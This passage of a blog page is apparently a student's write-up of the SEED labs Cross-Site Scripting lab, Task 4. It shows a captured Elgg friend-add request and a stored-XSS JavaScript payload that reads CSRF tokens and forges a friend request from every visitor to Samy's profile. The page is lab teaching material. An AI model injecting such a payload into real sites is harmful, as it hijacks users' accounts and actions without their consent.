300w,\n/static/f764054e2e564871a5dfc863824f6ab6/0a47e/3.png 600w,\n/static/f764054e2e564871a5dfc863824f6ab6/2b2c6/3.png 869w\"\n        sizes=\"(max-width: 869px) 100vw, 869px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>This is because when a user tries to view Samy’s profile, the JavaScript code in the profile is executed.</p>\n<h2 id=\"task-4-becoming-the-victims-friend\" style=\"position:relative;\"><a href=\"#task-4-becoming-the-victims-friend\" aria-label=\"task 4 becoming the victims friend permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Task 4: Becoming the Victim’s Friend.</h2>\n<p>The purpose of this attack is to write an Cross-site Scripting Attack that adds Samy as a friend to any other user that visits Samy’s profile.</p>\n<p>Log in to Charlie’s account and Samy as a friend. During the process, Use HTTP Header Live to capture the header sent while adding Samy as a friend.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 871px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADp0lEQVQ4y4WTS0xcVRjH79KdceWiSuLGxNaFiaKbAq1aIOkClUdrW0ur4AwMtJQyFSgvwaZAa4SKKQ9ticBMi7WthKCxC6mmaSILlTLAwAzznmGG4XXnybx+nhnRpDXVk/zy/+6953z3fC+pcvA+h4cWKdZaOKIxc3jExFGtUI2VgmE7hSM2wV9aJLRIY99WBwevuTiodfKu1sGha07eG3UhNZ/r4iO1mrrTKuqqVdRva3VFCWdOKak5qaDmhAJ1lYJT4l2V6oMU1RWldLSdpbG2SnwrE3vLqVdXIr2juIy6uZ/vbmi4Narl5nUNk3d+4OpALzm5+1Lsy36D7Jw32bM3k8ys3YKMFFl7MlOakbn7H5U+PN3NlaFxAn4f6+vr+AMB/H4/DoeT+ZlprMYFHGYjq24HG14X614n8qoT36oD35qT1WUzTosej92A07yAVFyqpqd/BMeKl2WXE5fTgdvtZnPNyz2DlwndCj8bN7hjCnLfHOdXM4zr4cYcfPsIYwsxpIKiUi50fYlrU8azvIzL5WJT9hENynx+z03esJV8Uaj8ISfpV7/g+a8P8dygkmcGy0kTPDtYJuwynr5ynBzNT0hvZbxNa3UTFpuNJYORxUUDJpMZm9nEN7/M0j72gM7xGaGz1E2McvLHTlRjnVSOdaRQjbWnUNxupeX290jlqlq6P7vMjG4OvX6BWd0sOoF+TsQQDdGnnUDVdInzPcOcaOynu3eC/1pSfsV5Gjr7MIibzc/pMRgN6Gbn0E3/QSIcIE/5MU/u3M+OVwqR0vaQnqckHNkiQZxYPEYssY2wtyIRpF3H2qho/wq3w47NZsdisWK2WESFH8BWkPzSenbtPcpLuSU89UI2+4triYiDyZVIJFL8bUejUaSLBwq53tOETm/CtGTEbLbg9njwiGonHeYdP8MTaa+SnlXEjhdzKFC2EI3FHu9Q/X4VA5d60S8uYbXaMBqNImwTK6KF4mG/yNun7BSFO3Cshtdyi2nsGiYeTzzeoaK8jXMdfdydvMukYGpqKhW63WIm5JNZEhX/7fdppkVe1zY2ReOHH3LyL4dHlJ+gqDxLc3MzjQ0NXLzQSSgUSuUpybLoy/n5eYwGgzjwcO4eJeXw5ddLaG0fEKMn49/cILjqQfb5CQWDIrQ4KysekQorsizzfyu5X6pp6WFk+CZepx23GD+fmONQKExQ3DIYDLEm5jtpR8Tfk20R3oqwHthCDoRSrMkh8RwkIC4QEPonwkv7nFLelfoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4-1\"\n        title=\"4-1\"\n        src=\"/static/b53d3c3f7a32aab649a4e9e33ce65c33/9d5da/1.png\"\n        srcset=\"/static/b53d3c3f7a32aab649a4e9e33ce65c33/5a46d/1.png 300w,\n/static/b53d3c3f7a32aab649a4e9e33ce65c33/0a47e/1.png 600w,\n/static/b53d3c3f7a32aab649a4e9e33ce65c33/9d5da/1.png 871w\"\n        sizes=\"(max-width: 871px) 100vw, 871px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>This is the captured header.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 864px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACP0lEQVQ4y62TS28SURzF5zv4Gdyb+BU0vjYaUxUTH01cmrgw0drEnS5MdIPEGiMGLS0doFAE1BoXrpqaFqGAluEpUmgH6MzAMMMMAsd7L9LGxFdrb/LLzX2de+//5HDjt+/Aan0I/ywPDz8N3uVkeN0uBAOzCBFeznnJ+gwCPjcCfg/rPbwT7+bDCJI1Dz8FNznj87jAHT53Dzb7K6yXi8hkskgmE8ik00gTBEImk2GkUikIKQGCMGSwJ5/PEfLI5XIoFovgLl99gAm7D9lsGrGVOBJUkAh/LZUgVquQJBm1Wg31zU1omg5FUdBsqmi1WtB0HbT1+33WN1UV3PmL12B95CC3CVhaXsZKPI5IJIKP0ShEUYQkyzAMA79v/S3BRqMB7shxC2yPn2NjYx35QgE58vxypYIqeZ1MxDqdDjvwN7YEjx44BLvt2eCuXv/Xb9iJoGXkCpyT3p9qsdum0hqeGr2Jp845fOuYPwre3BVUjJaJ23dyDHcdIaLfI85paLfbO0YnblPj6vU6uLETxzDvtw+L9f9fvnH6AkJunk30ut1/MuDPpliu44XrNZvo7oXgyKVxTM6E9+LHzBxu/8EzuG91MlNopGiBaaxUdeAc3aRpGpvXWT9E30YbmEmDwJ0dvQXHdBCKLLEs0mTIskKSI7Is09TQzJqmyZw0DBNthjGgvd2b5Cz3PprHUrqC1bKMTyWJ8XlNJmOFkSLQMZ1fXZMQ+yLB/kHE1GIB4UgBT97mMbEQw5vFBBaSBXwHyRSX7SjS0NcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4-2\"\n        title=\"4-2\"\n        src=\"/static/dbe2dbfb26b42663c69fccdb1d203681/9cab2/2.png\"\n        srcset=\"/static/dbe2dbfb26b42663c69fccdb1d203681/5a46d/2.png 300w,\n/static/dbe2dbfb26b42663c69fccdb1d203681/0a47e/2.png 600w,\n/static/dbe2dbfb26b42663c69fccdb1d203681/9cab2/2.png 864w\"\n        sizes=\"(max-width: 864px) 100vw, 864px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">http://www.xsslabelgg.com/action/friends/add?friend=47&amp;__elgg_ts=1637220487&amp;__elgg_token=4PpQ6ZDUkh5PZhhZYvs0nw&amp;__elgg_ts=1637220487&amp;__elgg_token=4PpQ6ZDUkh5PZhhZYvs0nw\nHost: www.xsslabelgg.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://www.xsslabelgg.com/profile/samy\nX-Requested-With: XMLHttpRequest\nCookie: Elgg=55ph2nhijjv90btc83laaumpq3\nConnection: keep-alive\n\nGET: HTTP/1.1 200 OK\nDate: Thu, 18 Nov 2021 07:28:16 GMT\nServer: Apache/2.4.18 (Ubuntu)\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Length: 364\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: application/json;charset=utf-8</code></pre></div>\n<p>Log in to Sammy’s account and Edit the profile as following using HTML.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">&lt;script type=\"text/javascript\">\n  window.onload = function () {\n    var Ajax = null;\n    var ts = \"&amp;__elgg_ts=\" + elgg.security.token.__elgg_ts;\n    var token = \"&amp;__elgg_token=\" + elgg.security.token.__elgg_token;\n    //Construct the HTTP request to add Samy as a friend.\n    var sendurl =\"http://www.xsslabelgg.com/action/friends/add?friend=47\" + ts + token;\n    //Create and send Ajax request to add friend\n    Ajax = new XMLHttpRequest();\n    Ajax.open(\"GET\", sendurl, true);\n    Ajax.setRequestHeader(\"Host\", \"www.xsslabelgg.com\");\n    Ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    Ajax.send();\n  };\n&lt;/script></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 907px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADO0lEQVQ4y5VUW08TURDeF3+H/gETn3j1gogUBFFAMBg1oBEUEAOCkqigidHEFxMf1HhDKAbBKwkSJcZHeSAQLgWVUi7bbru73ZZe9tJtP+ccaNEYFE/yZXbPnvlm5ps5K1Q//oqKLjcqnQtkPRyVTg/Kncs49HwJh7vSWEZJ9+8o6/GuwimivEfE0RdeCJfb7+BSSysuN9ej7eJ5tDaRbWnkaG6sxYWGM2g6X8NtfW31Ks5W41xNFTqutOBqWzN9r0VT41m0kK+Qf+Iurt18hI8D/Xjb14v3r17iy6cPdLAVB4scKCp0wJGXA4djH/Idufy98EAeig8WoCA/F3n7c5Czdzeys3che89OCBWnb6C7dwiplA1ZVqBpQcRicSiKArd7Dh6PB5Lkg0rvkcgKFDmAgF+CFlQRJITDIQTIT/T5IflECCWVdXjW3Y/5+TnMzMzSpg9BVUUopCGkaeQQhmEYsCwLlmlyJCxmDRhWAomEBZuQSCRg0jkhZ08pujr7YNGmbpjYzLLsFLcLy364RRnJ9D6RCsW7S9Hz+AW8VJb7xw9IXi8kUcTKygqVHssgyhCNciiqBp2szy9j0adgjZ9XIRw73oDXrwehkh6TExNwz8zAQ8Ti0hJEIvYSfAQ5EIDKpQhBUxXEgjKXQlUoQ9teJ9xe3oYHfcMI04EpIvzmcmGWSF3T05gcG4NrchLfZ2exMD8PH+mrBoPwSxKimkoSGTzjjBSMMOvAKXS+es+jjo+OYnp8HBMjI3BNTWFpLcsAZccgyzLvvkSEkUgEuq7zPfvXDG8XF2Fk0IlQROfjoVAJit/Pu8ucmJZp5zTi8Xim60wC206uEx4pa0Bv3xDpQwIvLvJ5S6VSm+o205ARpgOw0RGqaq/jzcBnJJM2DarGhzqZTP4TLChvCjVKIbBnTrh1RxnuPeynoYytRYvBNFfnkTltBLZYZn6Sh0nCFicUtmSh/dYT2Facrl2IH05n8C9YdGOYxmECI8sQdtx+yiOwETBIdKZHmvhv+OMGsaZso5Lv3u9FmOaK/RwMQ8+Mwf8um2V4su4G+t8N80sejcY4GYtkbgD2LaabBAO6ufocpX+ASc9xqu4nZnrvQ2Z7k/YAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4-3\"\n        title=\"4-3\"\n        src=\"/static/724845ac7011a3673643b6370e624a4c/142fb/3.png\"\n        srcset=\"/static/724845ac7011a3673643b6370e624a4c/5a46d/3.png 300w,\n/static/724845ac7011a3673643b6370e624a4c/0a47e/3.png 600w,\n/static/724845ac7011a3673643b6370e624a4c/142fb/3.png 907w\"\n        sizes=\"(max-width: 907px) 100vw, 907px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>The code is an JavaScript program that forges an HTTP requests that adds Samy as a friend to the victim.</p>\n<p>In the code, the variable <code class=\"language-text\">ts</code> is a timestamp. The variable <code class=\"language-text\">token</code> is a security token. These variables are a countermeasure against Cross Site Request Forgery attacks. All requests will carry the correct value of these variables. Because Cross Site Requests do not have the correct value, forged requests will be easily identified by the server.</p>\n<p>They change every time a page is loaded, so they need to be accessed by Cross Site Scripting attack to get the correct values. The code finds the correct value of <code class=\"language-text\">ts</code> and <code class=\"language-text\">token</code>, uses it to construct the correct HTTP request to add Samy as a friend, and sends the request when executed.</p>\n<p>Log out of Samy’s account and Log in to Alice’s account. Try viewing Samy’s Profile using Alice’s account.</p>\n<p>When we refresh the page, it shows that Samy is a friend of Alice, even though Alice did not press the “add friend” button.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 904px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADo0lEQVQ4y5WTW0xcRRjHz6uJPhtfmvgijcbUGNOkRkGhUKDINpYiFxEqKQRrYVkKLFBagUrLpVAVcLmbuJS1F0uXttiallL0pbV1NdqA9BKh9ObegN1lOXv5OedQyFLqg5P88v9m5j/fzJz5jvRhywhbu8ZI7hlXdWvXONu6x9nSNcHmzgkSOm8KFvW9rpVoem6T2H0bTfctUvqnSTPdQ6qsrqekVE+FXkd5qU5oEfpiLcVFuygVWrK7QGiBqjrtzmW0BXnU7t9LTdUe9CWFwlNImVgvJWQepnJ/O2dPmjje38dxk5Hh80OUFmnZHB9NXFw0Gze+Q7RAUaUfuymKeKGbYiKJiowgIuItwsPfJEIgpe6oYeD0ZZTm9bgJ+n2PYxcP7t3l0cMHzDoduGZn8MsLeNxzarww78Y77xFjXubmXDgcThx2K1L6di27dJXUNX1JTX0zldW1lOyppqLqc8o+q2VvzQEONByi7lAzBxtDaVqOG5q+4HBrO73tBiRNTBLv67vRm/9C13+NXKMFrclCnvE6Jd9dI6XHQmLHb2g6LWgUXYWFLWIuoetPPu24hJTxrobkfUfJu+Al59RDsgdt5A9ZVdWds5M16CTl1Cyp5v8mzTxDktlN8fe3kD7ZoSW9vJ38IxYKv72C1niVfOMvFPVdJcswSk7nT+R2XCanY0TVbMMlMluH+ajlIlltwyrbBemtI5QbBpHWfaDnm4ERfhj9ldr2Y3QfPUet4RjmC1ew2e08stpZ8Afwyv5l5hdkrDYbd/6ewmp3Cp9g1oXr/hTSq/HZmE7/SLa+mWfDYnlxQyrSmkgydXXide1M353myfaPzUF9qxGXyw3BAH6fj4AY91lFYTdq4rg+fJLM3Q2EvZ3GK1GZPBcWQ15Zk7o4qBAMLqM0t2ee329M4PP7Fz2BgOqTlYRpSTs5OzRKRkEVz6xZz+vhyTz/cgyF1W2q2a+YQ5It6VILnfPZ7iNl5+7jzPmfqTj4NWs3JLIto5D1sVm0HRlSTYFAcFXCgNgk8Hij0E3UhC+9kUJv3xnc4g/448Y4N+9MYnPMMOvyKM4VV+Yp8YqE1mkkSVpH41cm8R0WGBsbY2pqcsV1+D8JZ2xKwtdobDEpl2Nyckqc1L18rcXFKx9FnXuiv5RQln1IL6xNxNA7gE+ex+mcCf3cqx4g5OhPHZZlGSnl43JOmC+KE/lwidMpr6oiSkJlqR+C7PMjizmlbNRY1KHi9Xq9/AsFBn56ThWqJgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4-4\"\n        title=\"4-4\"\n        src=\"/static/5ae2d0c175758d00ebc79848e090f8c8/d9217/4.png\"\n        srcset=\"/static/5ae2d0c175758d00ebc79848e090f8c8/5a46d/4.png 300w,\n/static/5ae2d0c175758d00ebc79848e090f8c8/0a47e/4.png 600w,\n/static/5ae2d0c175758d00ebc79848e090f8c8/d9217/4.png 904w\"\n        sizes=\"(max-width: 904px) 100vw, 904px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>This is because when a user tries to view Samy’s profile, the JavaScript code in the profile is executed.</p>","frontmatter":{"title":"[SEED labs] Cross-Site Scripting (XSS) Attack Lab Attack Lab","date":"November 18, 2021"}}},"pageContext":{"slug":"/SEEDlabs/XSS/","previous":{"fields":{"slug":"/SEEDlabs/CSRF/"},"frontmatter":{"title":"[SEED labs] Cross-Site Request Forgery (CSRF) Attack Lab"}},"next":{"fields":{"slug":"/SEEDlabs/setUID/"},"frontmatter":{"title":"[SEED labs] Environment Variable and Set-UID Program Lab (1)"}}}},"staticQueryHashes":["2486386679","3128451518"]}